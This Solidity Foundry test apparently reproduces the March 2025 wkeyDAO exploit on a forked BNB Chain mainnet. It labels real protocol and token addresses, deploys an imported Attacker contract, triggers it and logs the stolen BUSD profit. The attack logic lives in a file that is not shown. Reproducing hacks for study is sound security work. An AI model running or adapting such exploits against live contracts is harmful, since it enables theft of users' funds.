// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/Test.sol";
import { console2 } from "@dev/forge-std/console2.sol";
import { Attacker, BUSD } from "@contracts/Hack/20250314-wkeyDAO.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
/*
    forge test --match-path foundry/test/Hack/20250314-wkeyDAO.t.sol -vvvvv
*/
// https://app.blocksec.com/explorer/tx/bsc/0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8?line=12

contract wkeyDAO_Attacker_20250314_Test is Test {
    // hacking attack address
    address private player = address(1);

    function setUp() public {
        vm.deal(player, 10_000 ether);
        vm.createSelectFork({ urlOrAlias: "bnb_mainnet", blockNumber: 47_469_059 });
        vm.label(player, "Attacker Account");

        vm.label(0xD511096a73292A7419a94354d4C1C73e8a3CD851, "WebKeyProSales");
        vm.label(0x55d398326f99059fF775485246999027B3197955, "Binance-Peg BSC-USD (BSC-USD)");
        vm.label(0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F, "BEP-20: WebKey DAO (wkeyDAO)");
        vm.label(0x10ED43C718714eb63d5aA57B78B54704E256024E, "Pancake SwapRouterV2");
        vm.label(0xC1ee50b36305F3f28958617f82F4235224D97690, "WebKeyNFT (WKNFT)");
        vm.label(0x591AAaDBc85e19065C88a1B0C2Ed3F58295f47Df, "BEP-20: ASET (ASET)");
        vm.label(0x8665A78ccC84D6Df2ACaA4b207d88c6Bc9b70Ec5, "BEP-20: Pancake LPs (Cake-LP)");
        vm.label(0x107F3Be24e3761A91322AA4f5F54D9f18981530C, "BEP-20: DLP_107f3be2 (DLP)");
        vm.label(0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9, "DVM");
    }

    function test_Exploit() public {
        vm.startPrank(player);

        Attacker attc = new Attacker();

        uint256 balanceBefore = IERC20(BUSD).balanceOf(address(attc));

        attc.fire();

        uint256 balanceAfter = IERC20(BUSD).balanceOf(address(attc));

        console2.log("Profit: ", (balanceAfter - balanceBefore) / 1e18);
        // Hacker hackInst = new Hacker();
        // hackInst.attack();
    }
}
